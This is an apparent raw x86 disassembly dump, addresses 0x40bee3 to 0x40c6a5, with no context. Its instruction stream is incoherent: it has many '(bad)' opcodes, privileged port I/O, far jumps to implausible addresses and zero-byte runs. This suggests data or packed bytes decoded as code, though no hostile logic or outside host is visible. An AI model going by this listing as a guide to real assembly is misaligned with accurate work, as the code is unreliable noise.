  40bee3:	pop    eax
  40bee4:	jb     0x40bf19
  40bee6:	jno    0x40bf65
  40bee8:	cld    
  40bee9:	xor    ebx,eax
  40beeb:	jmp    0x40be8f
  40beed:	xor    BYTE PTR [ecx+0x28],bh
  40bef0:	jb     0x40bf04
  40bef2:	test   cl,0xea
  40bef5:	mov    dh,BYTE PTR [edx+0x247f0efe]
  40befb:	ss jnp 0x40bf1b
  40befe:	jl     0x40bf11
  40bf00:	fadd   QWORD PTR [esi]
  40bf02:	test   cl,0xea
  40bf05:	mov    dh,BYTE PTR [edx+0x37c419fe]
  40bf0b:	test   al,cl
  40bf0d:	pop    es
  40bf0e:	jne    0x40bf8b
  40bf10:	test   al,0x7
  40bf12:	ss push esi
  40bf14:	jb     0x40bebd
  40bf16:	cmc    
  40bf17:	sahf   
  40bf18:	test   al,0x1
  40bf1a:	jne    0x40bf1e
  40bf1c:	xchg   edi,eax
  40bf1d:	dec    esp
  40bf1e:	(bad)  
  40bf1f:	int3   
  40bf20:	call   0x40bf28
  40bf25:	add    BYTE PTR [eax],al
  40bf27:	jne    0x40bf45
  40bf29:	jmp    0xa9fd99a2
  40bf2e:	add    ecx,DWORD PTR [edx-0x51]
  40bf31:	repz push ebx
  40bf33:	add    DWORD PTR [edx-0x17],0xffffff80
  40bf37:	mov    dh,0xfe
  40bf39:	xchg   edx,eax
  40bf3a:	add    DWORD PTR [ebp+0x28],ebx
  40bf3d:	add    BYTE PTR [edx],ah
  40bf3f:	xor    eax,0xd7b06802
  40bf44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf45:	adc    ecx,edx
  40bf47:	hlt    
  40bf48:	jmp    0xd4c1:0x76f5e901
  40bf4f:	out    0xb0,al
  40bf51:	out    0xb1,eax
  40bf53:	icebp  
  40bf54:	scas   eax,DWORD PTR es:[edi]
  40bf55:	(bad)  
  40bf56:	in     al,dx
  40bf57:	test   al,0x2
  40bf59:	add    cl,ch
  40bf5b:	push   0x79435016
  40bf60:	jge    0x40bfd6
  40bf62:	jns    0x40bf56
  40bf64:	(bad)  
  40bf65:	(bad)  
  40bf66:	xchg   ecx,eax
  40bf67:	or     dh,BYTE PTR [ebp+0x0]
  40bf6a:	jmp    0xcabe2e6c
  40bf6f:	cmc    
  40bf70:	xor    eax,0xafdf51d8
  40bf75:	(bad)  
  40bf76:	jmp    0xe8967769
  40bf7b:	jbe    0x40bffa
  40bf7d:	inc    esp
  40bf7e:	cmp    DWORD PTR [ecx-0x61e63a85],ebp
  40bf84:	call   0x2985:0x279fb5e
  40bf8b:	add    BYTE PTR [eax],al
  40bf8d:	add    BYTE PTR [eax],al
  40bf8f:	add    BYTE PTR [esi-0x6b],dh
  40bf92:	mov    edi,0x836396d
  40bf97:	sbb    dh,BYTE PTR [ecx]
  40bf99:	and    eax,0x43d339a3
  40bf9e:	add    BYTE PTR [esi-0x16ff6267],bl
  40bfa4:	jbe    0x40c023
  40bfa6:	test   BYTE PTR [ebx],ch
  40bfa8:	les    ebp,FWORD PTR [edi-0x51433802]
  40bfae:	(bad)  
  40bfaf:	test   eax,0x59f935a9
  40bfb4:	js     0x40bf6f
  40bfb6:	ret    0x6f62
  40bfb9:	test   DWORD PTR [edi+0x4eae5000],edi
  40bfbf:	call   0x3e21f7
  40bfc4:	dec    edi
  40bfc5:	pushf  
  40bfc6:	inc    dl
  40bfc8:	dec    esp
  40bfc9:	mov    cl,0xe6
  40bfcb:	fstp   QWORD PTR [edi+0x6]
  40bfce:	add    BYTE PTR [esi+0x41],dl
  40bfd1:	mov    bh,0xbc
  40bfd3:	or     dl,ch
  40bfd5:	inc    edi
  40bfd6:	add    BYTE PTR [esi-0x55],dl
  40bfd9:	or     DWORD PTR [eax],ebx
  40bfdb:	adc    bl,BYTE PTR [esi+eax*1-0x80]
  40bfdf:	cmp    eax,0x41d1a4
  40bfe4:	mov    ecx,gs
  40bfe6:	push   ss
  40bfe7:	call   0x3e336b
  40bfec:	loopne 0x40bfaf
  40bfee:	jb     0x40bffe
  40bff0:	fistp  WORD PTR [edx+0xddea]
  40bff6:	add    BYTE PTR [eax],al
  40bff8:	add    BYTE PTR [edi+0x51c60006],cl
  40bffe:	mov    bl,bl
  40c000:	inc    ebx
  40c001:	pop    esp
  40c002:	pop    es
  40c003:	push   esi
  40c004:	jmp    DWORD PTR [ecx]
  40c006:	(bad)  
  40c007:	adc    DWORD PTR [eax+0x4c],eax
  40c00a:	or     ah,BYTE PTR [esi-0x35]
  40c00d:	pop    DWORD PTR [esi]
  40c00f:	push   0x0
  40c011:	inc    esp
  40c012:	cmp    bl,dh
  40c014:	inc    ebx
  40c015:	sbb    al,0x71
  40c017:	adc    esp,DWORD PTR [eax]
  40c019:	pop    ds
  40c01a:	inc    edx
  40c01b:	add    BYTE PTR [ebx+0x74f47abc],cl
  40c021:	pop    ss
  40c022:	adc    bh,bh
  40c024:	push   esi
  40c025:	dec    ebx
  40c026:	or     bl,BYTE PTR [ebx+edx*1]
  40c029:	int3   
  40c02a:	add    DWORD PTR [ebp+0x3d10c0c0],eax
  40c030:	sbb    ah,0x1
  40c033:	add    BYTE PTR [esp+esi*2+0x48],dh
  40c037:	call   DWORD PTR ds:0x40159f75
  40c03d:	jne    0x40c007
  40c03f:	ret    0xf85d
  40c042:	(bad)  [esi]
  40c044:	push   cs
  40c045:	(bad)  
  40c046:	pop    edi
  40c047:	out    0x3,al
  40c049:	in     al,dx
  40c04a:	call   0xc57d:0xa5ce0072
  40c051:	sahf   
  40c052:	(bad)  
  40c053:	cmc    
  40c054:	mov    edi,0x5502a7b7
  40c059:	out    dx,al
  40c05a:	mov    DWORD PTR [ebx+ebp*8+0x0],0xef1b8500
  40c065:	out    0xb0,eax
  40c067:	fadd   DWORD PTR [ebx]
  40c069:	add    BYTE PTR [ebx],ah
  40c06b:	adc    al,0x37
  40c06d:	xor    eax,ebx
  40c06f:	mov    ds:0x157542d0,eax
  40c074:	mov    cl,0x14
  40c076:	lea    ebp,[ecx-0x320affbe]
  40c07c:	call   0x8275:0x29bb6dc
  40c083:	and    DWORD PTR [ebp-0x3],0x52
  40c087:	test   BYTE PTR [edi-0x7c623e41],al
  40c08d:	and    al,0x51
  40c08f:	xchg   esi,eax
  40c090:	inc    esp
  40c091:	add    BYTE PTR [ebp+0x65],dh
  40c094:	push   es
  40c095:	call   0x14318ea
  40c09a:	ret    
  40c09b:	dec    esp
  40c09c:	pop    ss
  40c09d:	sbb    al,0x87
  40c09f:	pop    ebx
  40c0a0:	add    ch,BYTE PTR [edx+0x77]
  40c0a3:	jae    0x40c122
  40c0a5:	je     0x40c0ac
  40c0a7:	push   ebx
  40c0a8:	dec    ecx
  40c0a9:	sti    
  40c0aa:	je     0x40c047
  40c0ac:	jnp    0x40c0f2
  40c0ae:	ins    DWORD PTR es:[edi],dx
  40c0af:	sahf   
  40c0b0:	xchg   edx,eax
  40c0b1:	(bad)  
  40c0b2:	cli    
  40c0b3:	call   0x3e9:0x274021a
  40c0ba:	inc    ebp
  40c0bb:	jns    0x40c0e3
  40c0bd:	pushf  
  40c0be:	adc    ebp,DWORD PTR [ecx+0x64f03e7]
  40c0c4:	pop    esp
  40c0c5:	inc    edi
  40c0c6:	add    BYTE PTR [eax],al
  40c0c8:	add    BYTE PTR [eax],al
  40c0ca:	add    BYTE PTR [ecx-0x2d358dae],al
  40c0d0:	pop    edi
  40c0d1:	add    DWORD PTR [ebx],eax
  40c0d3:	jne    0x40c154
  40c0d5:	jae    0x40c086
  40c0d7:	out    dx,eax
  40c0d8:	ret    
  40c0d9:	add    dh,ch
  40c0db:	scas   al,BYTE PTR es:[edi]
  40c0dc:	add    ch,cl
  40c0de:	sbb    eax,0x1453ad81
  40c0e3:	mov    ds:0x81b0d536,al
  40c0e8:	dec    esi
  40c0e9:	test   DWORD PTR [ebx+0x75],0xffffac81
  40c0f0:	ret    
  40c0f1:	rcr    BYTE PTR [eax+0x7e],1
  40c0f4:	add    ch,cl
  40c0f6:	push   eax
  40c0f7:	sbb    edi,DWORD PTR [ebx+0x5772ffaa]
  40c0fd:	jb     0x40c09e
  40c0ff:	cmc    
  40c100:	sahf   
  40c101:	and    al,0x8
  40c103:	jne    0x40c107
  40c105:	imul   ebp,esi,0x429a0ea
  40c10b:	je     0x40c15c
  40c10d:	pop    ds
  40c10e:	pop    ecx
  40c10f:	dec    dl
  40c111:	cmc    
  40c112:	or     BYTE PTR [edi+0x74167fc2],al
  40c118:	add    ch,cl
  40c11a:	jle    0x40c105
  40c11c:	shl    BYTE PTR [ebx-0x50],cl
  40c11f:	sub    ebx,DWORD PTR [ebx+0x2753108]
  40c125:	fs inc esi
  40c127:	xor    DWORD PTR [ebx+0x4e],edx
  40c12a:	ss jge 0x40c1a4
  40c12d:	cs push ebx
  40c12f:	add    BYTE PTR [eax],al
  40c131:	add    BYTE PTR [eax],al
  40c133:	add    BYTE PTR ds:0x3b03ddc,bl
  40c139:	xchg   bh,bh
  40c13b:	adc    DWORD PTR [ebx-0x23],eax
  40c13e:	mov    WORD PTR [edx+edi*4+0x2819683b],fs
  40c145:	inc    ecx
  40c146:	add    BYTE PTR [ecx+0x69000277],dl
  40c14c:	and    eax,0x36faa417
  40c151:	add    dh,bh
  40c153:	and    DWORD PTR [eax-0x3e],edi
  40c156:	std    
  40c157:	sub    DWORD PTR [eax-0x63],edx
  40c15a:	add    cl,ch
  40c15c:	jbe    0x40c1d5
  40c15e:	int    0x27
  40c160:	ja     0x40c164
  40c162:	inc    ecx
  40c163:	xor    ebp,DWORD PTR [ecx+ebp*4-0x18]
  40c167:	mov    bl,0x79
  40c169:	add    al,BYTE PTR [eax]
  40c16b:	push   0xc
  40c16d:	ret    
  40c16e:	sti    
  40c16f:	into   
  40c170:	loop   0x40c11d
  40c172:	mov    ebp,DWORD PTR [ecx+edx*2-0x54]
  40c176:	(bad)  
  40c177:	mov    esi,0xa1847d29
  40c17c:	lds    ebp,FWORD PTR [esi+edi*8+0x4c88c1]
  40c183:	jmp    0x724cf877
  40c188:	inc    esi
  40c189:	jle    0x40c10f
  40c18b:	mov    eax,ds:0x81feac25
  40c190:	xchg   edx,eax
  40c191:	dec    esp
  40c192:	add    cl,ch
  40c194:	icebp  
  40c195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c196:	push   DWORD PTR [eax+0x0]
  40c19c:	add    BYTE PTR [ecx+0x2],bh
  40c19f:	jbe    0x40c18d
  40c1a1:	pop    esp
  40c1a2:	call   FWORD PTR [esi-0x7e]
  40c1a5:	(bad)  
  40c1a6:	out    dx,eax
  40c1a7:	enter  0xde6a,0xfe
  40c1ab:	push   cs
  40c1ac:	je     0x40c1e6
  40c1ae:	sbb    DWORD PTR [edx],eax
  40c1b0:	mov    bh,0x9f
  40c1b2:	lds    ebp,FWORD PTR [ecx-0x17]
  40c1b5:	das    
  40c1b6:	ret    0xe7
  40c1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ba:	push   esp
  40c1bb:	add    DWORD PTR [eax],eax
  40c1bd:	adc    esi,DWORD PTR ds:0x3ebff8b7
  40c1c3:	add    BYTE PTR [ebx+0x387505a3],al
  40c1c9:	popa   
  40c1ca:	cmp    DWORD PTR [eax],ecx
  40c1cc:	push   eax
  40c1cd:	push   ecx
  40c1ce:	jns    0x40c18e
  40c1d0:	sti    
  40c1d1:	sbb    DWORD PTR [ebx+0x4e],0xffffff8b
  40c1d5:	lahf   
  40c1d6:	daa    
  40c1d7:	pop    esp
  40c1d8:	or     al,0x45
  40c1da:	sub    DWORD PTR [edi-0x19a43c05],edi
  40c1e0:	popf   
  40c1e1:	loop   0x40c1e1
  40c1e3:	dec    DWORD PTR [edx+0x75f479ac]
  40c1e9:	jno    0x40c208
  40c1eb:	in     eax,dx
  40c1ec:	add    DWORD PTR [esi+edi*8+0x71dc858c],ecx
  40c1f3:	std    
  40c1f4:	(bad)  
  40c1f5:	(bad)  
  40c1f7:	(bad)  
  40c1f8:	aas    
  40c1f9:	inc    ebp
  40c1fa:	jmp    0x5be3abf7
  40c1ff:	std    
  40c200:	inc    DWORD PTR [eax]
  40c202:	add    BYTE PTR [eax],al
  40c204:	add    BYTE PTR [eax],al
  40c206:	pop    ss
  40c207:	jmp    0x75fd:0xa681890b
  40c20e:	add    DWORD PTR fs:[ebx-0x3c],0xffffffaa
  40c213:	push   ecx
  40c214:	push   eax
  40c215:	push   0x416bfc
  40c21a:	hlt    
  40c21b:	pop    esp
  40c21c:	inc    BYTE PTR [eax]
  40c21e:	pop    esp
  40c21f:	sub    al,0xd7
  40c221:	cmp    ecx,DWORD PTR [ecx-0x56]
  40c224:	jb     0x40c22c
  40c226:	pop    edx
  40c227:	xchg   BYTE PTR [edi],bl
  40c229:	into   
  40c22a:	sbb    eax,0x1deeb906
  40c22f:	push   es
  40c230:	add    BYTE PTR [ebp-0x42a67],cl
  40c236:	jne    0x40c288
  40c238:	vmovddup ymm3,YMMWORD PTR [ebx+edi*1+0x75]
  40c23e:	or     al,0x36
  40c240:	ret    0xa35e
  40c243:	fs mov ebx,0x579b6dc1
  40c249:	mov    esp,ecx
  40c24b:	sbb    al,0xa7
  40c24d:	div    esp
  40c24f:	(bad)  
  40c251:	add    al,0x75
  40c253:	fwait
  40c254:	push   ecx
  40c255:	push   esi
  40c256:	inc    edx
  40c257:	push   ds
  40c258:	ja     0x40c27d
  40c25a:	push   ebp
  40c25b:	call   0x2e:0xa7dd0002
  40c262:	jne    0x40c27a
  40c264:	inc    edi
  40c265:	and    al,0x59
  40c267:	mov    ebp,DWORD PTR [ebp+0x74]
  40c26d:	add    BYTE PTR [eax],al
  40c26f:	jge    0x40c295
  40c271:	lds    ecx,FWORD PTR [edi-0x63]
  40c274:	popf   
  40c275:	lods   al,BYTE PTR ds:[esi]
  40c276:	(bad)  
  40c277:	mov    ds:0x85244016,al
  40c27c:	jmp    0xb850:0x74460119
  40c283:	je     0x40c220
  40c285:	add    al,BYTE PTR [eax+0x42b96b0d]
  40c28b:	jne    0x40c298
  40c28d:	jnp    0x40c2d2
  40c28f:	cdq    
  40c290:	(bad)  
  40c291:	jp     0x40c2ee
  40c293:	xchg   ecx,eax
  40c294:	mov    ebx,0xaba114ab
  40c299:	inc    edx
  40c29a:	add    al,dh
  40c29c:	pop    edx
  40c29d:	sbb    al,BYTE PTR ss:[eax]
  40c2a0:	(bad)  
  40c2a2:	or     esp,DWORD PTR [ebp+0x6124482e]
  40c2a8:	or     edi,DWORD PTR [edi+0x43]
  40c2ab:	xchg   ecx,eax
  40c2ac:	mov    bh,0x52
  40c2ae:	lea    esi,[ecx-0x1717f141]
  40c2b4:	add    ecx,ebp
  40c2b6:	add    dh,BYTE PTR [ebp-0x63]
  40c2b9:	jmp    0x5fe9f53e
  40c2be:	dec    eax
  40c2bf:	pop    ecx
  40c2c0:	push   cs
  40c2c1:	push   0xffffffac
  40c2c3:	or     edi,ecx
  40c2c5:	ins    BYTE PTR es:[edi],dx
  40c2c6:	jg     0x40c2ca
  40c2c8:	test   eax,0xf937e8e8
  40c2cd:	ins    BYTE PTR es:[edi],dx
  40c2ce:	xchg   edx,esi
  40c2d0:	test   al,0xe8
  40c2d2:	add    BYTE PTR [eax],0x0
  40c2d5:	add    BYTE PTR [eax],al
  40c2d7:	add    BYTE PTR [esi-0x22],ch
  40c2da:	add    BYTE PTR [ebx],al
  40c2dc:	push   0x66acb8f3
  40c2e1:	fdivp  st(0),st
  40c2e3:	jle    0x40c313
  40c2e5:	fsubp  st(4),st
  40c2e7:	jle    0x40c2ef
  40c2e9:	fisub  WORD PTR [eax+0x26027500]
  40c2ef:	mov    BYTE PTR [esi+0x7503ea4a],dl
  40c2f5:	add    al,0xe9
  40c2f7:	add    esi,DWORD PTR [ebp-0x66]
  40c2fa:	or     DWORD PTR [ebp+0x75],0x5137de02
  40c301:	mul    BYTE PTR [ecx-0x4d]
  40c304:	call   0x3c7b:0x75029c51
  40c30b:	call   0x7ee2b87e
  40c310:	neg    ch
  40c312:	mov    eax,0x19027502
  40c317:	jg     0x40c2cf
  40c319:	fiadd  WORD PTR [ebx+edi*2-0x42]
  40c31d:	fidivr WORD PTR [esp+ebx*4]
  40c320:	repnz inc esi
  40c322:	jmp    0xc56fc12a
  40c327:	pop    ss
  40c328:	mov    ?,WORD PTR [ebx+0x36effcfc]
  40c32e:	(bad)  
  40c331:	sar    bh,1
  40c333:	arpl   WORD PTR [edx-0x617ea822],di
  40c339:	inc    esi
  40c33a:	add    cl,ch
  40c33c:	add    BYTE PTR [eax],al
  40c33e:	add    BYTE PTR [eax],al
  40c340:	add    BYTE PTR [ebp+0x34220c3e],bl
  40c346:	xor    al,0x2
  40c348:	pusha  
  40c349:	push   es
  40c34a:	imul   ebp,ebp,0xffffffe8
  40c34d:	jbe    0x40c351
  40c34f:	lea    ebp,[ebp+0x1a]
  40c352:	dec    eax
  40c353:	add    ecx,ebp
  40c355:	jbe    0x40c3d1
  40c357:	pop    ss
  40c358:	test   eax,0x62fa2daf
  40c35d:	xor    bl,dh
  40c35f:	or     edx,DWORD PTR [edx]
  40c361:	mov    ch,BYTE PTR [ecx-0x13]
  40c364:	call   0x6dcdc5df
  40c369:	fiadd  DWORD PTR [edi+0x1]
  40c36c:	jmp    0xa9583de7
  40c371:	jg     0x40c3a0
  40c373:	cli    
  40c374:	mov    edx,0x925e48b6
  40c379:	sub    eax,0xae2b5c9e
  40c37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37f:	push   ebx
  40c380:	jb     0x40c37f
  40c382:	push   edx
  40c383:	push   esi
  40c384:	ins    BYTE PTR es:[edi],dx
  40c385:	xor    al,0xa6
  40c387:	dec    edi
  40c388:	inc    ebx
  40c389:	js     0x40c325
  40c38b:	leave  
  40c38c:	iret   
  40c38d:	fisubr WORD PTR [eax+0x1445a984]
  40c393:	cmp    DWORD PTR [ecx*8-0xc1a8afd],0xffffffd7
  40c39b:	dec    edi
  40c39c:	rcr    edi,0xbb
  40c39f:	add    cl,ch
  40c3a1:	jecxz  0x40c360
  40c3a3:	jmp    0x0:0xf1
  40c3aa:	(bad)  
  40c3ab:	call   0xa933:0x278a5b3
  40c3b2:	mov    edi,0x6100c2b9
  40c3b7:	daa    
  40c3b8:	jmp    0x40c40b
  40c3ba:	bound  edx,QWORD PTR [ebx-0x73]
  40c3bd:	inc    ebp
  40c3be:	test   al,0x4e
  40c3c0:	push   0x2
  40c3c2:	hlt    
  40c3c3:	jne    0x40c3c1
  40c3c5:	call   FWORD PTR [ebx-0x3d7a10d9]
  40c3cb:	repnz push ds
  40c3cd:	mov    esp,ecx
  40c3cf:	pop    esi
  40c3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d1:	add    DWORD PTR [ecx],esp
  40c3d3:	sti    
  40c3d4:	mov    cl,BYTE PTR [ebp+0x4]
  40c3d7:	push   ecx
  40c3d8:	push   0x15
  40c3da:	pop    ebp
  40c3db:	xchg   BYTE PTR [ebp-0x18],bl
  40c3de:	out    0x91,al
  40c3e0:	(bad)  
  40c3e1:	inc    DWORD PTR [edx]
  40c3e3:	mov    edi,DWORD PTR [ebx-0x34]
  40c3e6:	int    0x2
  40c3e8:	mov    al,0x1
  40c3ea:	xchg   DWORD PTR [esi+0x6eefe854],esp
  40c3f0:	(bad)  
  40c3f1:	jmp    FWORD PTR [esi-0x7aa1a23e]
  40c3f7:	rol    BYTE PTR [edx],0x0
  40c3fa:	loope  0x40c423
  40c3fc:	jmp    0x40c381
  40c3fe:	adc    BYTE PTR [esi+0x7f],0xec
  40c402:	pusha  
  40c403:	add    DWORD PTR [eax],eax
  40c405:	add    BYTE PTR [ebx+0x5b],ah
  40c408:	jae    0x40c412
  40c40a:	les    esp,FWORD PTR [ebx]
  40c40c:	(bad)  
  40c40d:	inc    DWORD PTR [eax]
  40c40f:	add    BYTE PTR [eax],al
  40c411:	add    BYTE PTR [eax],al
  40c413:	stos   DWORD PTR es:[edi],eax
  40c414:	es mov edi,0x7b296f75
  40c41a:	and    al,0x84
  40c41c:	mov    dl,BYTE PTR [ecx]
  40c41e:	cmp    BYTE PTR [esi+0x544d8b02],cl
  40c424:	sub    eax,DWORD PTR [ebx+0x28a24]
  40c42a:	add    BYTE PTR [esp+eax*1-0x3f18a0eb],bl
  40c431:	out    0xeb,al
  40c433:	jne    0x40c45c
  40c435:	add    al,0x0
  40c437:	fisttp QWORD PTR [ebx+0x0]
  40c43a:	add    BYTE PTR [ebp+0x2e],dh
  40c43d:	aas    
  40c43e:	and    al,0x69
  40c440:	adc    DWORD PTR [eax+edx*2],eax
  40c443:	xor    al,bh
  40c445:	push   edx
  40c446:	push   ss
  40c447:	mov    ch,0x9b
  40c449:	test   ebx,eax
  40c44b:	jno    0x40c409
  40c44d:	jge    0x40c433
  40c44f:	mov    eax,0xa9fffed9
  40c454:	and    BYTE PTR [edi+0x1c6da450],dl
  40c45a:	or     al,0x2
  40c45c:	addr16 cli 
  40c45e:	out    0xf8,eax
  40c460:	xlat   BYTE PTR ds:[ebx]
  40c461:	add    eax,DWORD PTR [eax]
  40c463:	add    BYTE PTR [edi-0x5a],dl
  40c466:	dec    edi
  40c467:	pop    edi
  40c468:	mov    esi,0xdce0f69a
  40c46d:	test   eax,0xb11ee58a
  40c472:	je     0x40c4ed
  40c474:	leave  
  40c475:	ret    0xea
  40c478:	add    BYTE PTR [eax],al
  40c47a:	add    BYTE PTR [eax],al
  40c47c:	xchg   esp,eax
  40c47d:	and    BYTE PTR [eax-0x4],al
  40c480:	test   BYTE PTR [ebx],0xf7
  40c483:	jne    0x40c4fb
  40c485:	xchg   ecx,eax
  40c486:	not    BYTE PTR [edi+0x45]
  40c489:	test   DWORD PTR [ecx+0xe947d74],ebp
  40c48f:	dec    esp
  40c490:	mov    ebx,ebx
  40c492:	add    eax,DWORD PTR [ebx-0x17af684f]
  40c498:	test   eax,0xc5000260
  40c49d:	call   0x5502:0x97b7c948
  40c4a4:	out    dx,al
  40c4a5:	mov    bh,0x52
  40c4a7:	push   ecx
  40c4a8:	retf   
  40c4a9:	add    al,0x77
  40c4ab:	inc    esp
  40c4ac:	imul   ecx,DWORD PTR [ebx],0x275c81c
  40c4b2:	jmp    0x9bb111ba
  40c4b7:	test   eax,0x7f987953
  40c4bc:	inc    eax
  40c4bd:	cs in  eax,dx
  40c4bf:	jl     0x40c47a
  40c4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4c2:	adc    al,BYTE PTR [ebx]
  40c4c4:	iret   
  40c4c5:	add    dh,BYTE PTR [edx-0x46]
  40c4c8:	sbb    bh,BYTE PTR [edi]
  40c4ca:	jne    0x40c4d0
  40c4cc:	jne    0x40c547
  40c4ce:	jo     0x40c54f
  40c4d0:	and    ebp,DWORD PTR [edi]
  40c4d2:	out    dx,eax
  40c4d3:	push   ecx
  40c4d4:	or     eax,0x7503318a
  40c4d9:	jns    0x40c508
  40c4db:	dec    ecx
  40c4dc:	stos   DWORD PTR es:[edi],eax
  40c4dd:	mov    ebx,0x4f29
  40c4e2:	add    BYTE PTR [eax],al
  40c4e4:	add    dh,ch
  40c4e6:	xchg   ebp,eax
  40c4e7:	imul   esp,DWORD PTR [edi],0x2e9a026d
  40c4ed:	test   DWORD PTR [eax],ebx
  40c4ef:	jmp    0xe942820f
  40c4f4:	add    esp,DWORD PTR [esi-0x2111ef3e]
  40c4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fb:	sbb    eax,0xab77859d
  40c500:	sti    
  40c501:	cmp    bl,BYTE PTR [eax]
  40c503:	jmp    0x7be63925
  40c508:	sti    
  40c509:	ror    bh,cl
  40c50b:	inc    DWORD PTR [ebx]
  40c50d:	jne    0x40c58e
  40c50f:	sub    BYTE PTR [edi],ch
  40c511:	jno    0x40c503
  40c513:	sub    BYTE PTR [ebp-0x3a45a83],bl
  40c519:	adc    bh,BYTE PTR [edx-0x658afc18]
  40c51f:	stc    
  40c520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c521:	mov    esp,DWORD PTR [ebp+ecx*8-0x5f8792d2]
  40c528:	fwait
  40c529:	sub    eax,0xff03e7b9
  40c52e:	mov    edi,0xc0b211ff
  40c533:	add    ebp,ecx
  40c535:	stc    
  40c536:	fwait
  40c537:	call   FWORD PTR [ebx+ebx*2]
  40c53a:	cmp    al,0x74
  40c53c:	jmp    0x4c40:0x3c26449
  40c543:	ret    
  40c544:	add    ecx,DWORD PTR [ebx+0x4c]
  40c547:	ret    
  40c548:	sbb    al,0x0
  40c54a:	add    BYTE PTR [eax],al
  40c54c:	add    BYTE PTR [eax],al
  40c54e:	mov    eax,0x7a8d8297
  40c553:	ja     0x40c599
  40c555:	in     eax,0xc1
  40c557:	out    dx,eax
  40c558:	ficom  DWORD PTR [edi]
  40c55a:	les    edi,FWORD PTR [ecx+0x5c]
  40c55d:	gs push cs
  40c55f:	or     al,0xf
  40c561:	mov    eax,gs:0x83e9fea3
  40c567:	ds cld 
  40c569:	mov    ecx,0x46f959de
  40c56e:	int    0x7f
  40c570:	mov    edi,0xff5972ee
  40c575:	call   0xe1853cf0
  40c57a:	(bad)  
  40c57b:	push   0x770d26fe
  40c580:	dec    esp
  40c581:	icebp  
  40c582:	daa    
  40c583:	push   edx
  40c584:	mov    DWORD PTR [esi+ebx*1+0xd0de99c],ebp
  40c58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c58c:	mov    al,BYTE PTR [esi+edi*4+0x3196ef78]
  40c593:	mov    ch,0xe7
  40c595:	popa   
  40c596:	jno    0x40c59a
  40c598:	add    BYTE PTR [ebp-0x4a],ah
  40c59b:	or     bh,BYTE PTR cs:[edi]
  40c59e:	stc    
  40c59f:	retf   0xe8c9
  40c5a2:	jbe    0x40c593
  40c5a4:	cmc    
  40c5a5:	sbb    dl,dl
  40c5a7:	lock mov edi,0x889a2c61
  40c5ad:	add    BYTE PTR [ecx],dh
  40c5af:	mov    al,BYTE PTR [edi+0x75]
  40c5b5:	add    BYTE PTR [eax],al
  40c5b7:	sub    al,0x25
  40c5b9:	pop    esp
  40c5ba:	hlt    
  40c5bb:	addr16 jo 0x40c630
  40c5be:	adc    DWORD PTR [ebp+edi*8+0x74],esp
  40c5c2:	push   es
  40c5c3:	mov    WORD PTR [esi-0x97fea4],ss
  40c5c9:	inc    ebp
  40c5ca:	jmp    0x40c5bb
  40c5cc:	xchg   esi,eax
  40c5cd:	sar    DWORD PTR [edi-0x73],0x5b
  40c5d1:	jae    0x40c5df
  40c5d3:	rcr    ecx,0xe7
  40c5d6:	call   0x3f6929
  40c5db:	cwde   
  40c5dc:	mov    esi,0xf1934072
  40c5e1:	out    dx,eax
  40c5e2:	mov    ecx,ecx
  40c5e4:	mov    bh,ch
  40c5e6:	jne    0x40c57c
  40c5e8:	xchg   BYTE PTR [ebx-0x5],dl
  40c5eb:	mov    ds:0xa1d8885b,eax
  40c5f0:	icebp  
  40c5f1:	out    0xe8,eax
  40c5f3:	sbb    BYTE PTR [eax],al
  40c5f5:	add    BYTE PTR [eax],al
  40c5f7:	popa   
  40c5f8:	icebp  
  40c5f9:	sti    
  40c5fa:	call   0x3e1ecb
  40c5ff:	push   esi
  40c600:	mov    edi,0xf1932ee9
  40c605:	or     edx,DWORD PTR [eax+0x73]
  40c608:	adc    eax,ecx
  40c60a:	adc    bl,BYTE PTR [edi+edi*8]
  40c60d:	test   al,al
  40c60f:	call   0x648651d0
  40c614:	xchg   BYTE PTR [ebx+eax*1-0x3cc50164],dl
  40c61b:	add    BYTE PTR [eax],al
  40c61d:	add    BYTE PTR [eax],al
  40c61f:	add    BYTE PTR [ecx],ch
  40c621:	test   ecx,ebp
  40c623:	mov    cl,0x41
  40c625:	icebp  
  40c626:	out    0xe8,eax
  40c628:	test   al,0x0
  40c62a:	add    BYTE PTR [eax],al
  40c62c:	and    edx,esi
  40c62e:	sti    
  40c62f:	call   0xfeec7fa9
  40c634:	add    BYTE PTR [esi],0xc4
  40c637:	pop    esi
  40c638:	sbb    esp,eax
  40c63a:	mov    esp,0x4fab7dc1
  40c63f:	mov    ebx,DWORD PTR [ecx-0x5]
  40c642:	push   esp
  40c643:	push   ebx
  40c644:	retf   
  40c645:	clc    
  40c646:	js     0x40c68c
  40c648:	pop    ebp
  40c649:	fcomp  QWORD PTR [ebx]
  40c64b:	xchg   edi,eax
  40c64c:	jne    0x40c5f9
  40c64e:	add    ch,al
  40c650:	fwait
  40c651:	ja     0x40c5f8
  40c653:	(bad)  
  40c654:	out    dx,al
  40c655:	jnp    0x40c613
  40c657:	inc    esp
  40c658:	cmp    ch,BYTE PTR [edi+edi*2+0x795fa9f5]
  40c65f:	dec    esp
  40c660:	sub    eax,0x47330c06
  40c665:	and    eax,0x41225ec4
  40c66a:	adc    cl,0x88
  40c66d:	vmwrite ebx,DWORD PTR [ebx]
  40c670:	inc    esp
  40c671:	and    al,0xa5
  40c673:	cmp    al,BYTE PTR [esi]
  40c675:	mov    ebp,0x486169e1
  40c67a:	xor    BYTE PTR [eax],cl
  40c67c:	add    BYTE PTR [ecx-0x2],ch
  40c67f:	dec    edi
  40c680:	jmp    0x0:0x164abe
  40c687:	add    BYTE PTR [eax],al
  40c689:	xor    eax,0x69c381ab
  40c68e:	cs ret 
  40c690:	jae    0x40c70e
  40c692:	sub    al,0xbe
  40c694:	pop    ss
  40c695:	mov    ?,esp
  40c697:	xor    bl,ah
  40c699:	into   
  40c69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c69b:	mov    esp,0x4caaba44
  40c6a0:	call   0x449942
  40c6a5:	jmp    FWORD PTR [esi-0x5b]
